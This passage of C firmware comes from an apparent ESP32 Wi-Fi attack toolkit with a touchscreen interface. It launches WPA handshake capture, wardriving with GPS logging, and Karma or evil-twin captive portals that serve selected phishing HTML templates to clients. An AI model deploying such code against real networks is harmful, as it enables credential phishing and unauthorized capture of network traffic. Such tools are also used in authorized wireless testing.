        // Use existing scan results if available
        if (g_shared_scan_count > 0) {
            handshake_target_count = (g_shared_scan_count < MAX_AP_CNT) ? g_shared_scan_count : MAX_AP_CNT;
            memcpy(handshake_targets, g_shared_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
        }
    }
    
    lv_textarea_add_text(handshake_log_ta, "Starting handshake attack task...\n");
    lv_textarea_set_cursor_pos(handshake_log_ta, LV_TEXTAREA_CURSOR_LAST);
    
    // Start handshake attack task
    handshake_attack_active = true;
    
    // Allocate task stack from PSRAM (32KB for safety - vfprintf needs a lot)
    handshake_attack_task_stack = (StackType_t *)heap_caps_malloc(32768 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (handshake_attack_task_stack != NULL) {
        handshake_attack_task_handle = xTaskCreateStatic(
            handshake_attack_task,
            "handshake_attac",  // Max 15 chars for task name
            32768,  // Stack size - 32KB in PSRAM
            NULL,
            5,     // Priority
            handshake_attack_task_stack,
            &handshake_attack_task_buffer
        );
        if (handshake_attack_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create handshake attack task!");
            handshake_attack_active = false;
            heap_caps_free(handshake_attack_task_stack);
            handshake_attack_task_stack = NULL;
            lv_textarea_add_text(handshake_log_ta, "ERROR: Failed to create task\n");
        } else {
            ESP_LOGI(TAG, "Handshake attack task created with PSRAM stack (32KB)");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate PSRAM stack for handshake attack task!");
        handshake_attack_active = false;
        lv_textarea_add_text(handshake_log_ta, "ERROR: Failed to allocate PSRAM stack\n");
    }
    
    show_touch_dot = false;
    if (touch_dot) {
        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    }
}

static void handshake_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Set stop flag
    g_operation_stop_requested = true;
    
    // Stop current attack if running
    attack_handshake_stop();
    
    // Wait for task to finish
    if (handshake_attack_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping handshake attack task...");
        
        // Wait for task to finish naturally (max 10 seconds)
        int wait_count = 0;
        while (wait_count < 100) {  // 10 seconds max
            // Check if task still exists
            eTaskState task_state = eTaskGetState(handshake_attack_task_handle);
            if (task_state == eDeleted || task_state == eInvalid) {
                ESP_LOGI(TAG, "Handshake attack task finished naturally.");
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(100));
            wait_count++;
        }
        
        // If task still running, force delete it
        eTaskState task_state = eTaskGetState(handshake_attack_task_handle);
        if (task_state != eDeleted && task_state != eInvalid) {
            ESP_LOGW(TAG, "Handshake attack task forcefully stopped.");
            vTaskDelete(handshake_attack_task_handle);
        }
        
        // Always clear handle after task is deleted
        handshake_attack_task_handle = NULL;
        
        // Give extra time for task resources to be fully released
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    // Free PSRAM stack (only after task is completely done)
    if (handshake_attack_task_stack != NULL) {
        ESP_LOGI(TAG, "Freeing handshake task PSRAM stack...");
        heap_caps_free(handshake_attack_task_stack);
        handshake_attack_task_stack = NULL;
    }
    
    handshake_attack_active = false;
    handshake_disable_log_capture();
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    handshake_ui_active = false;
    scan_done_ui_flag = false;
    
    ESP_LOGI(TAG, "All operations stopped.");
    
    // Navigate back to menu
    nav_to_menu_flag = true;
}

// Wardrive task (from original project)
static void wardrive_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "Wardrive task started");
    
    // Use timestamp-based filename instead of scanning SD to avoid SPI conflicts with LVGL
    wardrive_file_counter = (int)(esp_timer_get_time() / 1000000);  // Unix timestamp in seconds
    ESP_LOGI(TAG, "Wardrive file will be: w%d.log", wardrive_file_counter);
    
    ESP_LOGI(TAG, "Waiting for GPS fix...");
    if (!wait_for_gps_fix(120)) {
        ESP_LOGI(TAG, "Warning: No GPS fix obtained, not continuing without GPS data");
        wardrive_active = false;
    } else {
        ESP_LOGI(TAG, "GPS fix obtained");
    }
    
    ESP_LOGI(TAG, "Wardrive started. Use Stop to stop");
    
    // Open file once at the beginning to minimize SPI conflicts
    char filename[64];
    snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
    
    FILE *file = fopen(filename, "a");
    if (file == NULL) {
        file = fopen(filename, "w");
        if (file == NULL) {
            ESP_LOGI(TAG, "Failed to create file %s - aborting wardrive", filename);
            wardrive_active = false;
            wardrive_task_handle = NULL;
            vTaskDelete(NULL);
            return;
        }
    }
    
    // Write header if file is new
    fseek(file, 0, SEEK_END);
    if (ftell(file) == 0) {
        fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board\n");
        fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
        fflush(file);  // Flush header
    }
    
    int scan_counter = 0;
    while (wardrive_active) {
        if (!wardrive_active) {
            ESP_LOGI(TAG, "Wardrive: Stop requested");
            break;
        }
        
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                parse_gps_nmea(line);
                line = strtok(NULL, "\r\n");
            }
        }
        
        // Use wifi_scanner API instead of direct ESP-IDF calls
        if (!wardrive_active) break;
        
        // Start scan using wifi_scanner component
        esp_err_t scan_err = wifi_scanner_start_scan();
        if (scan_err != ESP_OK) {
            ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_err));
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Wait for scan to complete (non-blocking scan from wifi_scanner)
        int timeout = 0;
        while (!wifi_scanner_is_done() && timeout < 200) {  // 20 seconds timeout
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout++;
            if (!wardrive_active) break;
        }
        
        if (!wardrive_active) break;
        
        // Get scan results from wifi_scanner
        int scan_count = wifi_scanner_get_results(wardrive_scan_results, MAX_AP_CNT);
        
        ESP_LOGI(TAG, "Wardrive: scanned %d networks", scan_count);
        
        // Get timestamp
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        
        // Process scan results and write to already-open file
        for (int i = 0; i < scan_count; i++) {
            wifi_ap_record_t *ap = &wardrive_scan_results[i];
            
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            char escaped_ssid[64];
            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
            
            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
            
            char line[512];
            if (current_gps.valid) {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi,
                        current_gps.latitude, current_gps.longitude,
                        current_gps.altitude, current_gps.accuracy);
            } else {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi);
            }
            
            fprintf(file, "%s", line);
        }
        
        // Flush instead of close to ensure data is written but keep file open
        fflush(file);
        
        if (scan_count > 0) {
            ESP_LOGI(TAG, "Logged %d networks to %s", scan_count, filename);
        }
        
        scan_counter++;
        
        if (!wardrive_active) {
            ESP_LOGI(TAG, "Wardrive: Stop requested");
            break;
        }
        
        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
    }
    
    // Close file only once at the end
    if (file) {
        fclose(file);
    }
    
    wardrive_active = false;
    wardrive_task_handle = NULL;
    ESP_LOGI(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
    
    vTaskDelete(NULL);
}

static void wardrive_start_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Set wardrive UI active flag
    wardrive_ui_active = true;
    scan_done_ui_flag = false;
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Create log display page
    wardrive_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(wardrive_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(wardrive_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_text(wardrive_log_ta, "Starting Wardrive...\n");
    lv_obj_set_style_bg_color(wardrive_log_ta, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_text_color(wardrive_log_ta, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_color(wardrive_log_ta, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(wardrive_log_ta, 2, 0);
    lv_obj_clear_state(wardrive_log_ta, LV_STATE_FOCUSED);
    
    // Create Stop button at bottom
    wardrive_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(wardrive_stop_btn, lv_pct(100), 45);
    lv_obj_align(wardrive_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(wardrive_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(wardrive_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
    lv_obj_set_style_border_color(wardrive_stop_btn, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(wardrive_stop_btn, 3, 0);
    lv_obj_t *stop_lbl = lv_label_create(wardrive_stop_btn);
    lv_label_set_text(stop_lbl, "Stop");
    lv_obj_set_style_text_color(stop_lbl, COLOR_MATERIAL_BLUE, 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(wardrive_stop_btn, wardrive_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    wardrive_enable_log_capture();
    
    // Start wardrive task
    if (wardrive_active || wardrive_task_handle != NULL) {
        ESP_LOGI(TAG, "Wardrive already running");
        return;
    }
    
    ESP_LOGI(TAG, "Starting Wardrive...");
    wardrive_active = true;
    
    // Allocate wardrive task stack from PSRAM
    wardrive_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (wardrive_task_stack != NULL) {
        wardrive_task_handle = xTaskCreateStatic(wardrive_task, "wardrive_task", 8192, NULL, 
            5, wardrive_task_stack, &wardrive_task_buffer);
        if (wardrive_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create wardrive task");
            heap_caps_free(wardrive_task_stack);
            wardrive_task_stack = NULL;
        } else {
            ESP_LOGI(TAG, "Wardrive task created with PSRAM stack");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate wardrive task stack from PSRAM");
    }
}

static void wardrive_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop wardrive
    if (wardrive_active || wardrive_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Wardrive...");
        wardrive_active = false;
        
        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
            // Free PSRAM stack
            if (wardrive_task_stack != NULL) {
                heap_caps_free(wardrive_task_stack);
                wardrive_task_stack = NULL;
            }
        }
        
        ESP_LOGI(TAG, "Wardrive stopped");
    }
    
    wardrive_disable_log_capture();
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    wardrive_ui_active = false;
    scan_done_ui_flag = false;
    nav_to_menu_flag = true;
}

static void show_karma_page(void)
{
    create_function_page_base("Karma");
    wifi_attacks_refresh_sd_html_list();

    karma_content = lv_obj_create(function_page);
    lv_obj_set_size(karma_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(karma_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(karma_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(karma_content, 0, 0);
    lv_obj_set_style_pad_all(karma_content, 10, 0);
    lv_obj_set_style_pad_gap(karma_content, 10, 0);
    lv_obj_set_flex_flow(karma_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // Probe Requests dropdown
    lv_obj_t *probe_label = lv_label_create(karma_content);
    lv_label_set_text(probe_label, "Probe Request SSID:");
    lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(probe_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    karma_probe_dd = lv_dropdown_create(karma_content);
    lv_obj_set_width(karma_probe_dd, lv_pct(100));
    lv_dropdown_set_dir(karma_probe_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(karma_probe_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
    lv_obj_set_style_text_color(karma_probe_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green text
    lv_obj_set_style_border_color(karma_probe_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green border
    lv_obj_t *dd_list1 = lv_dropdown_get_list(karma_probe_dd);
    if (dd_list1) {
        lv_obj_set_style_bg_color(dd_list1, lv_color_make(0, 0, 0), 0);  // Black background for list
        lv_obj_set_style_text_color(dd_list1, COLOR_MATERIAL_BLUE, 0);  // Green text for list
        lv_obj_set_style_border_color(dd_list1, COLOR_MATERIAL_BLUE, 0);  // Green border
    }

    // Get probe requests from sniffer
    int probe_count = 0;
    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
    
    // Build probe options
    size_t probe_buf_size = (probe_count > 0 ? probe_count : 1) * 64;
    char *probe_options = (char *)lv_mem_alloc(probe_buf_size);
    if (!probe_options) {
        probe_options = "Run Sniffer first to capture probe requests";
    }

    size_t probe_len = 0;
    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
        probe_options[0] = '\0';
    }

    int valid_probes = 0;
    for (int i = 0; i < probe_count && i < MAX_PROBE_REQUESTS; i++) {
        if (probes[i].ssid[0] == '\0') {
            continue;  // Skip broadcast probes
        }
        
        // Check if this SSID already exists in the list (skip duplicates)
        bool is_duplicate = false;
        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len > 0) {
            // Create a temporary copy to search
            char *search_pos = probe_options;
            char search_pattern[65];
            snprintf(search_pattern, sizeof(search_pattern), "%s\n", probes[i].ssid);
            if (strstr(search_pos, search_pattern) != NULL) {
                is_duplicate = true;
            }
        }
        
        if (is_duplicate) {
            continue;  // Skip duplicate SSID
        }
        
        char entry[64];
        snprintf(entry, sizeof(entry), "%s\n", probes[i].ssid);
        size_t entry_len = strlen(entry);
        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len + entry_len < probe_buf_size) {
            memcpy(probe_options + probe_len, entry, entry_len);
            probe_len += entry_len;
            probe_options[probe_len] = '\0';
            valid_probes++;
        }
    }

    if (valid_probes == 0) {
        if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
            snprintf(probe_options, probe_buf_size, "Run Sniffer first to capture probe requests");
        }
    }

    lv_dropdown_set_options(karma_probe_dd, probe_options);
    lv_dropdown_set_selected(karma_probe_dd, 0);

    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
        lv_mem_free(probe_options);
    }

    // HTML dropdown (same as Evil Twin)
    lv_obj_t *html_label = lv_label_create(karma_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    karma_html_dd = lv_dropdown_create(karma_content);
    lv_obj_set_width(karma_html_dd, lv_pct(100));
    lv_dropdown_set_dir(karma_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(karma_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
    lv_obj_set_style_text_color(karma_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green text
    lv_obj_set_style_border_color(karma_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green border
    lv_obj_t *dd_list2 = lv_dropdown_get_list(karma_html_dd);
    if (dd_list2) {
        lv_obj_set_style_bg_color(dd_list2, lv_color_make(0, 0, 0), 0);  // Black background for list
        lv_obj_set_style_text_color(dd_list2, COLOR_MATERIAL_BLUE, 0);  // Green text for list
        lv_obj_set_style_border_color(dd_list2, COLOR_MATERIAL_BLUE, 0);  // Green border
    }

    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    int evil_twin_html_count = 0;
    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            evil_twin_html_count++;
        }
    }

    if (evil_twin_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(karma_html_dd, html_options);
    lv_dropdown_set_selected(karma_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    // Start Karma button
    karma_start_btn = lv_btn_create(karma_content);
    lv_obj_set_width(karma_start_btn, lv_pct(100));
    lv_obj_set_height(karma_start_btn, 40);
    // Retro terminal styling for button with visible border
    lv_obj_set_style_bg_color(karma_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
    lv_obj_set_style_bg_color(karma_start_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(karma_start_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(karma_start_btn, 3, 0);  // Thick border (3px)
    lv_obj_set_style_border_opa(karma_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
    lv_obj_add_event_cb(karma_start_btn, karma_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(karma_start_btn);
    lv_label_set_text(start_label, "Start Karma");
    lv_obj_set_style_text_color(start_label, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(start_label);

    // Disable button if no probes or no HTML
    if (valid_probes == 0 || evil_twin_html_count == 0) {
        lv_obj_add_state(karma_start_btn, LV_STATE_DISABLED);
    }
}

static void karma_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!karma_probe_dd || !karma_html_dd) {
        return;
    }

    // Get selected probe request
    int probe_sel = lv_dropdown_get_selected(karma_probe_dd);
    int html_sel = lv_dropdown_get_selected(karma_html_dd);

    int probe_count = 0;
    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
    
    if (!probes || probe_count == 0) {
        ESP_LOGW(TAG, "No probe requests available");
        return;
    }

    // Find selected SSID from probes (skip broadcast probes)
    char selected_ssid[33] = {0};
    int valid_probe_index = -1;
    int current_valid = 0;
    for (int i = 0; i < probe_count && i < MAX_PROBE_REQUESTS; i++) {
        if (probes[i].ssid[0] == '\0') {
            continue;  // Skip broadcast
        }
        if (current_valid == probe_sel) {
            strncpy(selected_ssid, probes[i].ssid, sizeof(selected_ssid) - 1);
            valid_probe_index = i;
            break;
        }
        current_valid++;
    }

    if (valid_probe_index < 0 || selected_ssid[0] == '\0') {
        ESP_LOGW(TAG, "Invalid probe selection");
        return;
    }

    // Get HTML file
    int html_count = wifi_attacks_get_sd_html_count();
    if (html_sel < 0 || html_sel >= html_count) {
        ESP_LOGW(TAG, "Invalid HTML selection");
        return;
    }

    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);

    ESP_LOGI(TAG, "Starting Karma for SSID: %s", selected_ssid);

    // Create log display page
    create_function_page_base("Karma Log");

    karma_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(karma_log_ta, lv_pct(100), LCD_V_RES - 30 - 45);  // Leave space for Stop button
    lv_obj_align(karma_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_one_line(karma_log_ta, false);
    lv_textarea_set_cursor_click_pos(karma_log_ta, false);
    lv_textarea_set_password_mode(karma_log_ta, false);
    lv_textarea_set_text(karma_log_ta, "");
    // Retro terminal styling
    lv_obj_set_style_bg_color(karma_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
    lv_obj_set_style_text_color(karma_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green text

    // Stop button at the bottom
    karma_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(karma_stop_btn, lv_pct(100), 40);
    lv_obj_align(karma_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(karma_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(karma_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
    lv_obj_set_style_border_color(karma_stop_btn, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(karma_stop_btn, 3, 0);
    lv_obj_add_event_cb(karma_stop_btn, karma_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(karma_stop_btn);
    lv_label_set_text(stop_label, "Stop");
    lv_obj_set_style_text_color(stop_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_center(stop_label);

    karma_ui_active = true;

    if (karma_enable_log_capture() != ESP_OK) {
        lv_textarea_add_text(karma_log_ta, "Failed to initialize log capture\n");
        return;
    }

    char header[160];
    snprintf(header, sizeof(header), "Launching Karma for %s\n", selected_ssid);
    lv_textarea_add_text(karma_log_ta, header);
    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);

    if (html_name) {
        const char *html_display = strrchr(html_name, '/');
        if (html_display) {
            html_display++;
        } else {
            html_display = html_name;
        }

        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
        if (html_res != ESP_OK) {
            char warn[120];
            snprintf(warn, sizeof(warn), "Failed to set portal template: %s\n", esp_err_to_name(html_res));
            lv_textarea_add_text(karma_log_ta, warn);
        } else {
            char msg[120];
            snprintf(msg, sizeof(msg), "Portal template: %s\n", html_display);
            lv_textarea_add_text(karma_log_ta, msg);
        }
    }

    // Start portal with the selected SSID
    esp_err_t start_res = wifi_attacks_start_portal(selected_ssid);
    if (start_res != ESP_OK) {
        char err[96];
        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
        lv_textarea_add_text(karma_log_ta, err);
        karma_disable_log_capture();
        karma_ui_active = false;
        return;
    }

    lv_textarea_add_text(karma_log_ta, "Karma started. Awaiting log output...\n");
    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
}

static void karma_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping Karma...");
    wifi_attacks_stop_portal();
    
    karma_disable_log_capture();
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_ui_active = false;
    
    nav_to_menu_flag = true;
}

static void portal_ssid_ta_event_cb(lv_event_t *e)
{
    (void)e;
    // Show keyboard when text area is clicked
    if (portal_keyboard) {
        lv_obj_clear_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
        ESP_LOGI(TAG, "Keyboard shown");
    }
}

static void portal_keyboard_event_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    lv_obj_t *ta = lv_event_get_user_data(e);
    
    if (code == LV_EVENT_VALUE_CHANGED) {
        // Update buffer when text changes
        const char *txt = lv_textarea_get_text(ta);
        if (txt) {
            strncpy(portal_ssid_buffer, txt, sizeof(portal_ssid_buffer) - 1);
            portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';
        }
    }
    else if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        // Hide keyboard when "Close" button is pressed
        if (portal_keyboard) {
            lv_obj_add_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
            ESP_LOGI(TAG, "Keyboard hidden");
        }
    }
}

static void show_portal_page(void)
{
    create_function_page_base("Portal");
    wifi_attacks_refresh_sd_html_list();

    portal_content = lv_obj_create(function_page);
    lv_obj_set_size(portal_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(portal_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(portal_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(portal_content, 0, 0);
    lv_obj_set_style_pad_all(portal_content, 10, 0);
    lv_obj_set_style_pad_gap(portal_content, 10, 0);
    lv_obj_set_flex_flow(portal_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(portal_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // SSID text area with keyboard
    lv_obj_t *ssid_label = lv_label_create(portal_content);
    lv_label_set_text(ssid_label, "Portal SSID:");
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ssid_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    portal_ssid_ta = lv_textarea_create(portal_content);
    lv_obj_set_width(portal_ssid_ta, lv_pct(100));
    lv_textarea_set_one_line(portal_ssid_ta, true);
    lv_textarea_set_text(portal_ssid_ta, portal_ssid_buffer);
    lv_obj_set_style_bg_color(portal_ssid_ta, lv_color_make(0, 0, 0), 0);  // Black background
    lv_obj_set_style_text_color(portal_ssid_ta, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_set_style_border_color(portal_ssid_ta, COLOR_MATERIAL_BLUE, 0);  // Green border
    
    // Add event to show keyboard when text area is clicked
    lv_obj_add_event_cb(portal_ssid_ta, portal_ssid_ta_event_cb, LV_EVENT_CLICKED, NULL);

    // Create keyboard with close button
    portal_keyboard = lv_keyboard_create(function_page);
    lv_keyboard_set_textarea(portal_keyboard, portal_ssid_ta);
    lv_keyboard_set_mode(portal_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);  // Text mode with close button
    lv_obj_set_size(portal_keyboard, lv_pct(100), lv_pct(40));
    lv_obj_align(portal_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
    
    // Keyboard background - black
    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 0, 0), LV_PART_MAIN);
    lv_obj_set_style_text_color(portal_keyboard, COLOR_MATERIAL_BLUE, LV_PART_MAIN);
    
    // Keyboard buttons - green with black background
    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 100, 0), LV_PART_ITEMS);  // Dark green buttons
    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 150, 0), LV_PART_ITEMS | LV_STATE_PRESSED);  // Lighter green when pressed
    lv_obj_set_style_text_color(portal_keyboard, COLOR_MATERIAL_BLUE, LV_PART_ITEMS);  // Bright green text
    lv_obj_set_style_border_color(portal_keyboard, COLOR_MATERIAL_BLUE, LV_PART_ITEMS);  // Green border
    lv_obj_set_style_border_width(portal_keyboard, 1, LV_PART_ITEMS);
    
    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_VALUE_CHANGED, portal_ssid_ta);
    
    // Add event to hide keyboard when "Close" (OK) button is pressed
    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_READY, portal_ssid_ta);

    // HTML dropdown
    lv_obj_t *html_label = lv_label_create(portal_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    portal_html_dd = lv_dropdown_create(portal_content);
    lv_obj_set_width(portal_html_dd, lv_pct(100));
    lv_dropdown_set_dir(portal_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(portal_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
    lv_obj_set_style_text_color(portal_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green text
    lv_obj_set_style_border_color(portal_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green border
    lv_obj_t *dd_list = lv_dropdown_get_list(portal_html_dd);
    if (dd_list) {
        lv_obj_set_style_bg_color(dd_list, lv_color_make(0, 0, 0), 0);  // Black background for list
        lv_obj_set_style_text_color(dd_list, COLOR_MATERIAL_BLUE, 0);  // Green text for list
        lv_obj_set_style_border_color(dd_list, COLOR_MATERIAL_BLUE, 0);  // Green border
    }

    int html_total = wifi_attacks_get_sd_html_count();
